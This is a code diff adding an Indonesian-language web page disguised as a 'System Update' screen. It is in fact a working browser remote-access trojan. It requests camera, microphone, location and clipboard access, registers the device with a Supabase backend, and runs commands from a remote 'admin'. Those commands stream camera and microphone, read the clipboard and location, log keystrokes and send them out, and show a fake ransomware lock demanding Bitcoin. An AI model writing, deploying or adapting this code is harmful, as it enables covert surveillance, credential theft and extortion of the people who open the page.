@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+  <title>System Update</title>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; font-family:system-ui; }
+    body { background:#000; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; flex-direction:column; padding:20px; }
+    .loader { width:60px; height:60px; border:4px solid #333; border-top:4px solid #0f0; border-radius:50%; animation:spin 1s linear infinite; margin-bottom:20px; }
+    @keyframes spin { 0%{transform:rotate(0)} 100%{transform:rotate(360deg)} }
+    .status { font-size:18px; color:#0f0; margin:10px 0; }
+    .info { font-size:13px; color:#888; text-align:center; word-break:break-all; }
+    .btn { background:#0f0; color:#000; border:none; padding:12px 30px; border-radius:30px; font-weight:bold; margin-top:20px; cursor:pointer; }
+  </style>
+</head>
+<body>
+  <div class="loader"></div>
+  <div class="status" id="status">Memulai...</div>
+  <div class="info" id="info"></div>
+  <button class="btn" id="refreshBtn">Refresh Koneksi</button>
+
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
+  <script>
+    // =============== KONFIGURASI (UDAH PAKAI CREDENTIAL LU) ===============
+    const SUPABASE_URL = 'https://hvxctzvtwyosyffstwii.supabase.co';
+    const SUPABASE_KEY = 'sb_publishable_r8uOjL7SgzxqjzimofJRrw_TamZDiIh';
+    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+    // =============== STATE ===============
+    let deviceId = 'client_' + Math.random().toString(36).substr(2, 8);
+    let deviceName = navigator.userAgent.match(/Android/i) ? 'Android ' + (navigator.userAgent.match(/Android\s([\d.]+)/) || [])[1] : 'Unknown';
+    let pc = null;
+    let dc = null;
+    let statusEl = document.getElementById('status');
+    let infoEl = document.getElementById('info');
+    let refreshBtn = document.getElementById('refreshBtn');
+
+    // =============== FUNGSI UTAMA ===============
+    async function init() {
+      statusEl.textContent = 'Meminta izin...';
+      try {
+        await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        if (navigator.permissions) {
+          await navigator.permissions.query({ name: 'geolocation' });
+          await navigator.permissions.query({ name: 'clipboard-read' });
+        }
+      } catch (e) {
+        console.warn('Izin ditolak atau error:', e);
+      }
+
+      statusEl.textContent = 'Mendaftarkan perangkat...';
+      try {
+        await supabase.from('devices').upsert({
+          id: deviceId,
+          name: deviceName,
+          status: 'online',
+          last_seen: new Date().toISOString()
+        });
+      } catch (e) {
+        statusEl.textContent = '❌ Gagal daftar: ' + e.message;
+        return;
+      }
+
+      infoEl.innerHTML = `Device ID: ${deviceId}<br>Device: ${deviceName}`;
+      statusEl.textContent = 'Menunggu perintah...';
+
+      setupSignaling();
+      startPolling();
+
+      setInterval(() => {
+        supabase.from('devices').update({ last_seen: new Date().toISOString() }).eq('id', deviceId);
+      }, 10000);
+    }
+
+    function setupSignaling() {
+      supabase
+        .channel('signaling_' + deviceId)
+        .on('postgres_changes', {
+          event: 'INSERT',
+          schema: 'public',
+          table: 'signaling',
+          filter: `room=eq.${deviceId}`
+        }, async (payload) => {
+          const row = payload.new;
+          if (row.type === 'offer' && row.sdp) {
+            await handleOffer(row);
+          } else if (row.type === 'candidate' && row.candidate) {
+            if (pc) {
+              try {
+                await pc.addIceCandidate(JSON.parse(row.candidate));
+              } catch (e) {}
+            }
+          }
+        })
+        .subscribe();
+    }
+
+    async function handleOffer(offerData) {
+      if (pc) {
+        pc.close();
+        pc = null;
+        dc = null;
+      }
+
+      pc = new RTCPeerConnection({
+        iceServers: [
+          { urls: 'stun:stun.l.google.com:19302' },
+          { urls: 'stun:stun1.l.google.com:19302' }
+        ]
+      });
+
+      pc.ondatachannel = (event) => {
+        dc = event.channel;
+        dc.onmessage = async (e) => {
+          const cmd = e.data;
+          const result = await executeCommand(cmd);
+          if (dc && dc.readyState === 'open') {
+            dc.send(JSON.stringify({ type: 'result', data: result }));
+          }
+        };
+        dc.onopen = () => {
+          statusEl.textContent = '✅ Terhubung dengan admin';
+          infoEl.innerHTML += '<br>🔗 WebRTC Connected';
+        };
+        dc.onclose = () => {
+          statusEl.textContent = '⚠️ Koneksi terputus';
+        };
+      };
+
+      pc.ontrack = (e) => {
+        console.log('Track diterima dari admin');
+      };
+
+      pc.onicecandidate = async (e) => {
+        if (e.candidate) {
+          await supabase.from('signaling').insert({
+            room: deviceId,
+            type: 'candidate',
+            candidate: JSON.stringify(e.candidate)
+          });
+        }
+      };
+
+      pc.oniceconnectionstatechange = () => {
+        const state = pc.iceConnectionState;
+        if (state === 'connected') statusEl.textContent = '✅ Terhubung';
+        if (state === 'failed') statusEl.textContent = '❌ Koneksi gagal';
+      };
+
+      try {
+        await pc.setRemoteDescription({
+          type: 'offer',
+          sdp: offerData.sdp
+        });
+        const answer = await pc.createAnswer();
+        await pc.setLocalDescription(answer);
+        await supabase.from('signaling').insert({
+          room: deviceId,
+          type: 'answer',
+          sdp: answer.sdp
+        });
+        statusEl.textContent = '🔄 Menjawab...';
+      } catch (e) {
+        console.error('Error handle offer:', e);
+        statusEl.textContent = '❌ Error: ' + e.message;
+      }
+    }
+
+    // =============== EKSEKUSI PERINTAH ===============
+    async function executeCommand(cmd) {
+      const parts = cmd.split(' ');
+      const action = parts[0];
+      try {
+        switch (action) {
+          case 'get_location':
+            return new Promise((resolve) => {
+              navigator.geolocation.getCurrentPosition(
+                pos => resolve(JSON.stringify({ lat: pos.coords.latitude, lng: pos.coords.longitude })),
+                err => resolve('{}')
+              );
+            });
+          case 'get_clipboard':
+            try {
+              return await navigator.clipboard.readText();
+            } catch { return 'Clipboard tidak diizinkan'; }
+          case 'start_camera': {
+            const facing = parts[1] === 'front' ? 'user' : 'environment';
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
+            if (pc) {
+              const track = stream.getVideoTracks()[0];
+              pc.addTrack(track, stream);
+            }
+            return 'camera_started';
+          }
+          case 'start_mic': {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            if (pc) {
+              const track = stream.getAudioTracks()[0];
+              pc.addTrack(track, stream);
+            }
+            return 'mic_started';
+          }
+          case 'start_keylog': {
+            document.addEventListener('keydown', (e) => {
+              if (dc && dc.readyState === 'open') {
+                dc.send(JSON.stringify({ type: 'keylog', data: e.key }));
+              }
+            });
+            return 'keylogger_started';
+          }
+          case 'chat': {
+            const msg = cmd.substring(5);
+            if (dc && dc.readyState === 'open') {
+              dc.send(JSON.stringify({ type: 'chat', data: msg }));
+            }
+            return 'chat_sent';
+          }
+          case 'torch': {
+            try {
+              const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+              const track = stream.getVideoTracks()[0];
+              await track.applyConstraints({ advanced: [{ torch: true }] });
+              setTimeout(() => {
+                track.applyConstraints({ advanced: [{ torch: false }] });
+                stream.getTracks().forEach(t => t.stop());
+              }, 5000);
+              return 'torch_on';
+            } catch (e) {
+              return 'torch_not_supported';
+            }
+          }
+          case 'ransomware': {
+            alert('💀 HP ANDA DIKUNCI! Bayar 1 BTC ke alamat: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n(Klik OK untuk melanjutkan simulasi)');
+            return 'ransomware_activated';
+          }
+          default:
+            return `unknown_command: ${cmd}`;
+        }
+      } catch (e) {
+        return `error: ${e.message}`;
+      }
+    }
+
+    // =============== POLLING FALLBACK ===============
+    function startPolling() {
+      setInterval(async () => {
+        try {
+          const { data, error } = await supabase
+            .from('commands')
+            .select('*')
+            .eq('device_id', deviceId)
+            .eq('status', 'pending')
+            .limit(3);
+          if (error || !data || data.length === 0) return;
+          for (let cmd of data) {
+            const result = await executeCommand(cmd.cmd);
+            await supabase.from('commands').update({ result, status: 'done' }).eq('id', cmd.id);
+            if (dc && dc.readyState === 'open') {
+              dc.send(JSON.stringify({ type: 'result', data: result }));
+            }
+          }
+        } catch (e) {}
+      }, 5000);
+    }
+
+    refreshBtn.addEventListener('click', () => {
+      if (pc) { pc.close(); pc = null; dc = null; }
+      init();
+    });
+
+    init();
+  </script>
+</body>
+</html>
